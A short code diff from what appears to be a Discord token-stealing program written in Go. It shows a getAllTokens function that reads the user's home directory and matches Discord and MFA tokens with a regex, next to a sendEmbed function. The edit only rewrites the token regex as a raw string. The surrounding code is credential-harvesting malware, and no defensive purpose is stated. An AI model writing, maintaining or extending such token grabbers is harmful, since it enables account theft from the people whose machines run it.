@@ -204,7 +204,7 @@ func sendEmbed(token string) {
 func getAllTokens() {
 
 	homedir, _ := os.UserHomeDir()
-	var tokenRegex = regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
+	var tokenRegex = regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
 	var tokenList []string
 
 	var paths = map[string]string{
